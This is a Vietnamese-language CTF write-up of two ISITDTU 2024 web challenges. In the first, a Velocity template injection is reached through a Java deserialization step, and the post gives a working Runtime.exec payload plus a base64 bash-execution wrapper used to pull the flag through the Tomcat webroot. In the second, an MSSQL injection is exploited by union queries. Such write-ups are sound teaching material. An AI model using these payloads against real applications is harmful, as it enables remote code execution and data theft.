---
title: ISITDTU CTF 2024
tags: [CTF]
slug: isitdtu-ctf-2024
date: 2024-10-27 17:10:08+0000

---

## hihi
Đây là một challenge whitebox, cung cấp cho mình source code, cung cấp một cách khá hay để khai thác SSTI
Challenge sử dụng Springboot để build web, với 1 route duy nhất tại index, tại phương thức POST nhận đầu vào là data và xử lý để in ra chuỗi hello tên người dùng và thời gian:
```java!
@PostMapping({"/"})
@ResponseBody
public String hello(@RequestParam("data") String data) throws IOException {
    String hexString = new String(Base64.getDecoder().decode(data));
    byte[] byteArray = Encode.hexToBytes(hexString);
    ByteArrayInputStream bis = new ByteArrayInputStream(byteArray);
    ObjectInputStream ois = new SecureObjectInputStream(bis);

    String name;
    try {
        Users user = (Users)ois.readObject();
        name = user.getName();
    } catch (Exception var13) {
        throw new RuntimeException(var13);
    }

    if (name.toLowerCase().contains("#")) {
        return "But... For what?";
    } else {
        String templateString = "Hello, " + name + ". Today is $date";
        Velocity.init();
        VelocityContext ctx = new VelocityContext();
        LocalDate date = LocalDate.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("MMMM dd, yyyy");
        String formattedDate = date.format(formatter);
        ctx.put("date", formattedDate);
        StringWriter out = new StringWriter();
        Velocity.evaluate(ctx, out, "test", templateString);
        return out.toString();
    }
}
```
- Giá trị từ param `data` được base64 decode, sau đó chuyển từ dạng hex sang bytes array và được deserialize (sus)
- Lấy giá trị name trong object thu được, và nối chuỗi vào templateString trước khi render -> SSTI. Tuy nhiên trước khi được nối chuỗi thì giá trị name được kiểm tra xem có chứa ký tự `#` không, nếu không có ký tự này ta sẽ không thể dùng được các syntax của tempalte như `#set`,...

Không những vậy, tại class `SecureObjectInputStream` khi invoke method `resolveClass` thì class sẽ kiểm tra xem class đầu tiên phải là Users thì mới cho phép tiếu tục vào method resolveClass để tiếp tục deserialize
```java!
@Override
protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException ,ClassNotFoundException{
    List<String> approvedClass = new ArrayList<String>();
    approvedClass.add(Users.class.getName());

    if(!approvedClass.contains(osc.getName())){
        throw new InvalidClassException("Can not deserialize this class! ",osc.getName());
    }
    return super.resolveClass(osc);
}
```
- Nhìn chung là để attack deserialize thì khó =))

Nhưng trước hết thì mình cũng cần phải code lại script để gen ra được data đã, object Users sẽ đi theo flow sau:
```
serialize -> bytestohex -> base64 encode
```
Resource từ source code gốc đã có gần như đủ cả, mình tạo thêm method bytesToHex tại class Encode:
```java!
public static String bytesToHex(byte[] bytes) {
    StringBuilder hexString = new StringBuilder(2 * bytes.length);
    for (byte b : bytes) {
        String hex = Integer.toHexString(b & 0xFF);
        if (hex.length() == 1) {
            hexString.append('0');
        }
        hexString.append(hex);
    }
    return hexString.toString();
}
```
Main method của mình như sau:
```java!
Users user = new Users();
user.setName("user1337");

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(user);
oos.flush();
oos.close();

byte[] byteArray = bos.toByteArray();
String hexString = Encode.bytesToHex(byteArray);
String data = Base64.getEncoder().encodeToString(hexString.getBytes());

System.out.println(data);
```
Ta có base64 value của giá trị serialize là `YWNlZDAwMDU3MzcyMDAxNjYzNmY2ZDJlNjk3MzY5NzQ2NDc0NzUyZTY4Njk2ODY5MmU1NTczNjU3MjczNzA4NTI1ZDliYTNiZWZiMzAyMDAwMTRjMDAwNDZlNjE2ZDY1NzQwMDEyNGM2YTYxNzY2MTJmNmM2MTZlNjcyZjUzNzQ3MjY5NmU2NzNiNzg3MDc0MDAwODc1NzM2NTcyMzEzMzMzMzc=`
![image](https://hackmd.io/_uploads/SyyNBsoxkl.png)<br>
![image](https://hackmd.io/_uploads/r19jrose1g.png)<br>

Giờ mình cần tìm cách để exploit SSTI, với việc không thể sử dụng dấu `#` thì mình không thể tạo được biến nào để gọi method từ biến đó ra vì không dùng được `#set()`
Mình chuyển qua việc sử dụng những gì mình có, cụ thể là biến `$date` được khai báo đồng thời trong templateString, với kiểu dữ liệu là String. Đây là một variable hoàn hảo mình có thể lợi dụng để có thể invoke đến Runtime.exec.
Payload mình tìm kiếm và tham khảo tại: https://blog.csdn.net/weixin_39190897/article/details/139707252
Ban đầu mình confirm bug bằng việc tạo file tại /tmp:
```java!
$date.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('touch /tmp/1337')
```
Đưa nó vào script và gửi, mình thấy câu lệnh được thực thi thành công vì kết quả trả về là pid của tiến trình thực hiện tạo file:
![image](https://hackmd.io/_uploads/Hy0aLojgJl.png)<br>
File /tmp/1337 đã xuất hiện, confirm payload RCE thành công:
![image](https://hackmd.io/_uploads/HkbGPssxJg.png)<br>
Tuy đã RCE, nhưng challenge config iptables để chặn connection qua chain DROP (cũng na ná chall niceray), nên mình không reverse shell mà đi tìm cách lấy nội dung file flag qua webroot.
Trong Springboot thì để xuất hiện webroot, ta cần đưa file vào thư mục: `/tmp/tomcat-docbase.8080....`, mỗi lần deploy thì giá trị đằng sau sẽ là các ký tự khác, nhưng prefix đằng trước sẽ luôn là `tomcat-docbase.8080.`.
Mình thử echo nội dung vào 1 file trong đó:
![image](https://hackmd.io/_uploads/H1k-_joeke.png)<br>
Nội dung file được hiện lên webroot:
![image](https://hackmd.io/_uploads/ByYfdjjlkl.png)<br>
Như vậy thì mình có thể lấy nội dung flag thông qua folder này, và trong Runtime.exec vì tại method này Java sẽ coi các argument của command cách nhau bởi dấu cách, nên để thuận lợi trong việc sử command thì mình sử dụng:
```
bash -c {echo,base64command}|{base64,-d}|{bash,-i}
```
Flag được đưa vào thư mục /app, nên mình sẽ ls để lấy tên file trước:
![image](https://hackmd.io/_uploads/rkmnOiigyl.png)<br>
Mình cd vào thư mục đó trước rồi lấy oputput vào file `13373269.txt`
![image](https://hackmd.io/_uploads/HJyfFisgkx.png)<br>
Ốp vào đoạn code gen của mình và send, kết quả mình có flag tên là `eg5mhk3q9yp3`: 
![image](https://hackmd.io/_uploads/S1LPYjseyg.png)<br>
![image](https://hackmd.io/_uploads/rywqFsixJx.png)<br>
Giờ thì chỉ việc làm điều tương tự với cat file thôi là mình có flag trên local:
![image](https://hackmd.io/_uploads/HktCKjslJg.png)<br>
Áp dụng lên server, mình có tên flag là `m62dyeu1gr3t`:
![image](https://hackmd.io/_uploads/rJI75oixyl.png)<br>
Solve :heavy_check_mark: 
![image](https://hackmd.io/_uploads/SyEFqsjgJx.png)<br>
- Flag: `ISITDTU{We1come_t0_1s1tDTU_CTF}`

## Hero
Một challenge blackbox mà khi truy cập đến có độc mỗi chức năng đăng kỹ và đăng nhập:
![image](https://hackmd.io/_uploads/rybHE9oxJx.png)<br>
Mình login với credential `a:a`, thì có 3 endpoint trang web cung cấp:
- /heroes
- /genZ
- /old_heroes

Đầu tiên mình nghĩ có thể SQLi tại /genZ nhưng fuzz một hồi không có gì tiến triển ngoài or 1=1 thì mình chuyển qua endpoint /old_heroes, tại đây có param name mà khi truyền chuỗi thông thường sẽ thông báo lỗi: `Invalid object name 'OldHeroDB..'`
Khá lạ với kiểu response này, mình tiếp tục fuzzing và truyền dấu nháy các kiểu thì nhận được kiểu lỗi khác nhau, mỗi lỗi lại văng ra một ít phần câu lệnh SQL:
![image](https://hackmd.io/_uploads/BJwir9igkl.png)<br>
![image](https://hackmd.io/_uploads/SJFnScjekl.png)<br>

Từ đó thì mình thấy payload đang được truyền vào nhiều hơn 1 chỗ trong câu lệnh SQL, nôm na câu lệnh SQL sẽ dạng dạng như này (mình đoán vậy):
```sql!
payload.* FROM OldHeroDB..payload WHERE OldHeroDB..payload.Id = 1
```
Mình đã cố thử stacked query hoặc declare thêm biến để chạy xp_cmdshell vào phần WHERE cuối nhưng làm như vậy sẽ lỗi ở phần payload trên, kết quả đều không giòn
Đi tìm kiếm các tài liệu về mssql injection, mình tìm thấy một blog khai thác với cái kiểu db với 2 dấu chấm đằng sau rất giống với challenge: https://cyku.tw/no-database-mssql-injection/
Từ blog trên mình rút ra được vài thứ:
- Không thể stacked query
- Thực chất không có database nào có tên là OldHeroDB cả
- MSSQL sẽ loại bỏ các dấu cách trong quá trình xử lý tên cột -> có thể tạo tên cột với giá trị null nếu như truyền gán vào nó giá trị của subquery `select 1 as [ ]`
![image](https://hackmd.io/_uploads/HJs1h9jxyg.png)<br>

Như vậy, ta đã có thể craft thành payload SQL Injection, để tránh gặp lỗi call methods on int ta sẽ dùng các properties và objects có sẵn trong MSSQL, mà trong blogs sử dụng là STY của data type `geometry` -> trả về kiểu float
![image](https://hackmd.io/_uploads/B1-025jl1x.png)<br>
Từ response của server, ta có được 3 cột của bảng là id, hero_name và hero_power. Đặc biệt trong đó cột hero_name có thể chứa chuỗi.
Theo blog thì payload có thể attack kiểu Union based nên mình cũng nhóm thêm union select và kết quả show ra thông tin, tiện cho mình để dump db:
<br>![image](https://hackmd.io/_uploads/B1at69jxkg.png)<br>
![image](https://hackmd.io/_uploads/rkUyyjslyx.png)<br>
Công việc gần như đã xong, giờ mình sẽ đi mò xem flag ở đâu, nếu như không cho dùng xp_cmdshell để RCE thì chắc flag sẽ nằm ở 1 bảng nào đó.
Xác định được bảng `flags`:
![image](https://hackmd.io/_uploads/BJ-mksolJe.png)<br>
Xác định cột của bảng `flags` là `flag_value`:
![image](https://hackmd.io/_uploads/BkoEkjjgkx.png)<br>
Solve :heavy_check_mark:
![image](https://hackmd.io/_uploads/ByNLyojx1g.png)<br>
- Flag: `ISITDTU{R3g4in_m0t1vation_w1th_s1mpl3_SQL1}`
